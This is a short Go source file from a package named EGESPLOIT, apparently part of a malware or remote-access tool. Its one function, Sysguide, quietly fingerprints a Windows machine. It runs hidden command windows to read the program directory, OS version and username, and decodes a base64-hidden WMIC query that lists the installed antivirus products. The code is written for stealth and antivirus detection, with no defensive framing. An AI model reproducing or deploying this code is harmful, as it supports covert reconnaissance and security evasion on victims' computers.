package EGESPLOIT

import "encoding/base64"
import "path/filepath"
import "os/exec"
import "syscall"
import "strings"
import "os"




func Sysguide() (string, string, string, string){
	Dir, _ := filepath.Abs(filepath.Dir(os.Args[0]))

	Version_Check := exec.Command("cmd", "/C", "ver")
	Version_Check.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
  	Version, _ := Version_Check.Output()

  	GetUserCommand := string("echo "+"%"+"USERNAME"+"%")
	GetUser := exec.Command("cmd", "/C", GetUserCommand)
	GetUser.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
  	Username, _ := GetUser.Output()

  	Username[(len(Username)-1)] = ' '

  	var GetAV string = "V01JQyAvTm9kZTpsb2NhbGhvc3QgL05hbWVzcGFjZTpcXHJvb3RcU2VjdXJpdHlDZW50ZXIyIFBhdGggQW50aVZpcnVzUHJvZHVjdCBHZXQgZGlzcGxheU5hbWUgL0Zvcm1hdDpMaXN0"
    GetAvDecoded, _ := base64.StdEncoding.DecodeString(GetAV)

  	AV_Check := exec.Command("cmd", "/C", string(GetAvDecoded))
	AV_Check.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
  	AV_Out, _ := AV_Check.Output()

  	if strings.Contains(string(AV_Out), "=") {
  		AV := strings.Split(string(AV_Out), "=")
  		return string(Dir), string(Version), string(Username), string(AV[1])
  	}



  	return string(Dir), string(Version), string(Username), string(AV_Out)
}
